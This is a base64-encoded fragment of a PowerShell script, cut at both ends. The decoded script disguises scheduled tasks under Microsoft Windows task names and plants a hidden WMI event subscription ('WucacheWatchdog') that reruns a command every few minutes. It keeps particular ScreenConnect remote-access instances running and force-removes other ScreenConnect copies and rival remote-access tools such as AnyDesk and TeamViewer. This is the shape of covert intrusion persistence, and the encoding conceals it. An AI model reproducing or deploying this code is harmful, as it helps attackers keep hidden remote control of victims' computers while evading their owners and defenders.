b3N0Jw0KICAgIFRBU0tfRCA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29u
ZmxpY3QxJw0KICAgIE1PX0EgICA9ICcyJw0KICAgIE1PX0IgICA9ICczJw0KfQ0KDQpmdW5jdGlv
biBHZXQtSG9zdFNlZWQgew0KICAgICRzID0gMEwNCiAgICBmb3JlYWNoICgkYyBpbiAkZW52OkNP
TVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2lu
dF0kYykgJSAxMDAwMDAwMDA3IH0NCiAgICByZXR1cm4gJHMNCn0NCg0KZnVuY3Rpb24gUmVhZC1J
ZGVudGl0eSB7DQogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkNCiAgICBpZiAoVGVzdC1QYXRo
ICRjZmdQYXRoKSB7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQtQ29udGVudCAtTGl0
ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlKSkgew0KICAgICAgICAgICAgaWYgKCRsaW5lIC1tYXRj
aCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0gPSAk
bWF0Y2hlc1syXSB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRpZA0KfQ0KDQpmdW5j
dGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7DQogICAgaWYgKCR0bikgeyAmIHNj
aHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0NCn0NCg0KZnVu
Y3Rpb24gSW5pdGlhbGl6ZS1JZGVudGl0eSB7DQogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJ
REVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6DQogICAgIyBv
bGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZCwgdGhlbiBpZGVudGl0eSBpcyByZWdlbmVyYXRlZCBm
cm9tIHRoZSBzYW1lIHNlZWQuDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgew0KICAgICAg
ICAkb2xkID0gUmVhZC1JZGVudGl0eQ0KICAgICAgICBpZiAoJG9sZFsnSURFTlRWRVInXSAtZXEg
IiRJZGVudFZlcnNpb24iKSB7IHJldHVybiAkb2xkIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
J1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsgUmVtb3ZlLVRhc2tRdWlldCAk
b2xkWyRrXSB9DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9y
Y2UNCiAgICB9DQogICAgJHMgPSBHZXQtSG9zdFNlZWQNCiAgICAjIEw0OiB0d28gc2xvdHMgbWF5
IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4NCiAgICAj
IG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQgdGhlIGZsZWV0
IHNob3dzIDMvNC4NCiAgICAjIFdhbGsgZWFjaCBwb29sIGZvcndhcmQgdW50aWwgdGhlIHBpY2sg
aXMgdW5pcXVlIGFjcm9zcyBzbG90cy4NCiAgICAjIEw2OiB0aGUgb2xkIEAoQCgnQScsICRzICUg
OCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1LjE6DQogICAgIyBiYXJlICUg
aW5zaWRlIEAoKSBwYXJzZXMgYXMgdGhlIEZvckVhY2gtT2JqZWN0IGFsaWFzIChub3QgbW9kdWxv
KSwgc28gdGhlDQogICAgIyBjb2xsZWN0aW9uIGNvbGxhcHNlZCBhbmQgdGhlIGxvb3AgbmV2ZXIg
cmFuIC0+IGlkZW50aXR5LmNmZyBoYWQgRU1QVFkNCiAgICAjIFRBU0tfKiBhbmQgdGhlIHdob2xl
IGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNrIG5hbWVzLg0KICAgICRz
ZWVkcyA9IFtvcmRlcmVkXUB7DQogICAgICAgIEEgPSAoJHMgJSA4KQ0KICAgICAgICBCID0gKCgk
cyArIDMpICUgOCkNCiAgICAgICAgQyA9ICgoJHMgKyA1KSAlIDgpDQogICAgICAgIEQgPSAoKCRz
ICsgNykgJSA4KQ0KICAgIH0NCiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQ0KICAgIGZvcmVhY2gg
KCRsZXR0ZXIgaW4gJ0EnLCdCJywnQycsJ0QnKSB7DQogICAgICAgICRpID0gW2ludF0kc2VlZHNb
JGxldHRlcl0NCiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGldDQogICAgICAgICRu
ID0gMA0KICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRu
IC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07
ICRuKysgfQ0KICAgICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFtZSA9ICREZWZhdWx0c1siVEFT
S18kbGV0dGVyIl0gfQ0KICAgICAgICAkcGlja1skbGV0dGVyXSA9ICRuYW1lDQogICAgfQ0KICAg
ICRjZmcgPSBAKA0KICAgICAgICAiVEFTS19BPSQoJHBpY2suQSkiDQogICAgICAgICJUQVNLX0I9
JCgkcGljay5CKSINCiAgICAgICAgIlRBU0tfQz0kKCRwaWNrLkMpIg0KICAgICAgICAiVEFTS19E
PSQoJHBpY2suRCkiDQogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAy
LTUgbWluIGppdHRlcg0KICAgICAgICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAgICMg
My01IG1pbiBqaXR0ZXINCiAgICAgICAgIlNFRUQ9JHMiDQogICAgICAgICJJREVOVFZFUj0kSWRl
bnRWZXJzaW9uIg0KICAgICkNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGgg
LVZhbHVlICRjZmcgLUZvcmNlDQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQ0KfQ0KDQpmdW5j
dGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsNCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4g
JGZhbHNlIH0NCiAgICAkb2sgPSAkdHJ1ZQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1XbWlJbnN0
YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGltZXJJ
bnN0cnVjdGlvbiBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNo
ZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9
ICRmYWxzZSB9IHwgT3V0LU51bGwNCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgDQogICAgICAgICAg
ICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nRic7IEV2ZW50TmFtZXNwYWNl
ID0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1YWdlID0gJ1dRTCc7DQogICAgICAgICAgICAgICAg
ICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVy
SWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0NCiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5h
bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVy
IGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dDJzsg
Q29tbWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQuZXhlIC9jIGAiJE1vblBhdGhgIiI7IFJ1bkludGVy
YWN0aXZlbHkgPSAkZmFsc2UgfQ0KICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgDQogICAg
ICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQt
TnVsbA0KICAgIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQ0KICAgIHJldHVybiAkb2sNCn0NCg0K
ZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsNCiAgICAkYyA9IEdldC1XbWlPYmplY3QgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1G
aWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIg0KICAgIGlmICgkbnVsbCAtZXEgJGMpIHsN
CiAgICAgICAgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsDQogICAgICAgIHJldHVybiAnUkVB
Uk1FRCcNCiAgICB9DQogICAgcmV0dXJuICdPSycNCn0NCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lz
dGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQp
IHsgcmV0dXJuICdubycgfQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmlu
Z2VycHJpbnQpIg0KICAgIGZvcmVhY2ggKCRyb290IGluICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3Nv
ZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLA0KICAgICAgICAgICAgICAgICAg
ICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxDdXJyZW50VmVyc2lvblxVbmluc3RhbGwn
KSB7DQogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9w
ZXJ0eSAkXy5QU1BhdGgpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgJGRu
IC1saWtlICIqJG5hbWUqIiAtYW5kICRfLlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSB7IHJldHVy
biAneWVzJyB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rp
b24gUmVwYWlyLVNDU2VydmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgUmVjcmVh
dGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmluZyB0aGUgUkVHSVNURVJF
RCBwcm9kdWN0Lg0KICAgICMgbXNpZXhlYyAvZmEge0dVSUR9IHJlcGFpcnMgaW4gcGxhY2UgLSBp
dCBkb2VzIE5PVCBydW4gdGhlIFNDLWZhbWlseQ0KICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFs
LCBzbyBvdGhlciBpbnN0YW5jZXMgYXJlIHVudG91Y2hlZC4NCiAgICAjIEw1OiBhbHNvIGhhbmRs
ZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJpbmFyaWVz
LA0KICAgICMgdGhlbiBzdGFydCkuIE9ubHkgYSBSdW5uaW5nIHNlcnZpY2UgaXMgY29uc2lkZXJl
ZCBoZWFsdGh5Lg0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9
DQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAg
JHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVy
biAnc3ZjLXJ1bm5pbmcnIH0NCiAgICAkZ3VpZCA9ICRudWxsDQogICAgZm9yZWFjaCAoJHJvb3Qg
aW4gJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5z
dGFsbCcsDQogICAgICAgICAgICAgICAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2Rl
XEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcpIHsNCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9v
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAg
ICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUNCiAg
ICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4gLWxpa2UgIiokbmFtZSoiIC1hbmQgJF8uUFNDaGls
ZE5hbWUgLWxpa2UgJ3sqfScpIHsgJGd1aWQgPSAkXy5QU0NoaWxkTmFtZSB9DQogICAgICAgIH0N
CiAgICB9DQogICAgaWYgKC1ub3QgJGd1aWQpIHsgcmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQ0K
ICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
bmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICYg
cmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5z
dGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVs
bA0KICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdlcnByaW50
LmxvZyINCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAi
L2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQ0K
ICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDgNCiAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1lIiBz
dGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+
JjEgfCBPdXQtTnVsbA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDQNCiAgICAkc3ZjID0gR2V0
LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBp
ZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVz
dG9yZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQ0KICAgIGlmICgkc3ZjKSB7IHJldHVybiAic3Zj
LXN0aWxsLXN0b3BwZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQ0KICAgIHJldHVybiAic3ZjLXN0
aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSINCn0NCg0KZnVuY3Rpb24gSW52b2tlLUV4
dGVybWluYXRlIHsNCiAgICAjIFRydWUgcmVtb3ZhbCBvZiBldmVyeXRoaW5nIHJlbW90ZS1hY2Nl
c3MgZXhjZXB0IHRoZSB0d28gYWxsb3dsaXN0ZWQNCiAgICAjIFNjcmVlbkNvbm5lY3QgaW5zdGFu
Y2VzLiBPcmRlciBtYXR0ZXJzOiBwcm9kdWN0cyBmaXJzdCAoY2xlYW4gTVNJDQogICAgIyB1bmlu
c3RhbGwpLCB0aGVuIHNlcnZpY2VzLCBwcm9jZXNzZXMsIGFuZCBsZWZ0b3ZlciBkaXJzLg0KICAg
ICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVybWluYXRlLmxvZycNCiAgICAka2VlcCA9
IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JykNCiAgICAkbiA9IEB7IHN2
YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMCB9DQogICAgZnVu
Y3Rpb24gTG9nKFtzdHJpbmddJG0pIHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgiezB9IHsxfSIgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3Mn
KSwgJG0pIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICBmdW5jdGlvbiBJcy1L
ZWVwZXIoW3N0cmluZ10kcykgeyBmb3JlYWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2Ug
IiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH07IHJldHVybiAkZmFsc2UgfQ0KDQogICAgIyAxLiBm
b3JlaWduIFNDIHByb2R1Y3RzOiB0cnVlIE1TSSB1bmluc3RhbGwgKHN0b3BzL3JlbW92ZXMgY2xl
YW5seSkNCiAgICBmb3JlYWNoICgkcm9vdCBpbiAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywNCiAgICAgICAgICAgICAgICAgICAgICAn
SEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykgew0K
ICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkg
JF8uUFNQYXRoKS5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbWF0
Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZdezE2fSlcKScgLWFuZCAtbm90IChJ
cy1LZWVwZXIgJGRuKSAtYW5kICRfLlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSB7DQogICAgICAg
ICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94
ICQoJF8uUFNDaGlsZE5hbWUpIC9xbiAvbm9yZXN0YXJ0IiAtV2FpdCAtUGFzc1RocnUNCiAgICAg
ICAgICAgICAgICAkbi5wcm9kdWN0Kys7IExvZyAicHJvZHVjdF91bmluc3RhbGxlZCBbJGRuXSBl
eGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQog
ICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2VzIChsZWZ0b3ZlciBlbnRyaWVzIGFmdGVyIHVuaW5z
dGFsbCwgb3IgdW5yZWdpc3RlcmVkKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNl
IC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlKSkgew0KICAgICAgICBpZiAoLW5vdCAoSXMtS2VlcGVyICRzdmMuTmFtZSkpIHsNCiAgICAg
ICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAg
ICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDgwMA0KICAgICAgICAgICAgJiBzYy5l
eGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgJG4u
c3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIg0KICAgICAgICB9DQogICAgfQ0K
DQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3NlcyBieSBleGVjdXRhYmxlIHBhdGgNCiAgICBH
ZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNv
bm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
DQogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0aA0KICAgICAgICBpZiAoJGV4ZSAtYW5k
IC1ub3QgKElzLUtlZXBlciAkZXhlKSkgew0KICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAk
Xy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAg
ICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQgJGV4ZSINCiAgICAgICAgfQ0KICAgIH0N
Cg0KICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMNCiAgICBmb3JlYWNoICgkYmFzZSBp
biBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAg
ICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVl
IH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAt
RmlsdGVyICdTY3JlZW5Db25uZWN0KicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAg
ICBpZiAoLW5vdCAoSXMtS2VlcGVyICRkKSkgew0KICAgICAgICAgICAgICAgIEdldC1DaW1JbnN0
YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUgbGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICAgICAgICAgIFdoZXJl
LU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1saWtlICIkZCoiIH0gfA0KICAgICAgICAgICAg
ICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1G
b3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgICAgICAgICAgJiB0
YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAg
ICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOkYnIC9UIC9DIDI+JjEgfCBP
dXQtTnVsbA0KICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVj
dXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgICAg
ICBpZiAoVGVzdC1QYXRoICRkKSB7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDI7IFJlbW92ZS1JdGVt
IC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGQpIHsgTG9nICJkaXJfUkVN
T1ZFX0ZBSUxFRCAkZCIgfSBlbHNlIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0N
CiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMgNS4gZGlzYWxsb3dlZCBS
TU0gdG9vbHM6IHByb2R1Y3RzLCBzZXJ2aWNlcywgcHJvY2Vzc2VzLCBkaXJzDQogICAgJHJtbSA9
IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9j
PUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsg
UHJvZD1AKCdBbnlEZXNrKicpIH0NCiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2VyJzsgIFN2Yz1A
KCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUZWFtVmlld2Vy
Iik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9DQogICAgICAgIEB7IFRhZz0nTWVzaEFnZW50Jzsg
ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAo
J01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xN
ZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1A
KCdNZXNoKkFnZW50KicpIH0NCiAgICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgIFN2Yz1AKCdT
cGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcCon
LCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNw
bGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdT
cGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgU3ZjPUAoJ0xvZ01l
SW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWlnbml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdM
TUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dN
ZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUlu
KicpIH0NCiAgICAgICAgQHsgVGFnPSdHb1RvJzsgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdH
b1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Np
c3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdv
VG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIiwiJGVudjpQcm9ncmFt
RmlsZXNcR29Ub0Fzc2lzdCoiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29Ub0Fzc2lzdCoi
KTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdD
b25uZWN0V2lzZSc7IFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3Zj
KicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIpOyBQcm9kPUAoJ0Nvbm5l
Y3RXaXNlKicsJ0xhYlRlY2gqJykgfQ0KICAgICAgICBAeyBUYWc9J0F0ZXJhJzsgICAgICAgU3Zj
PUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJB
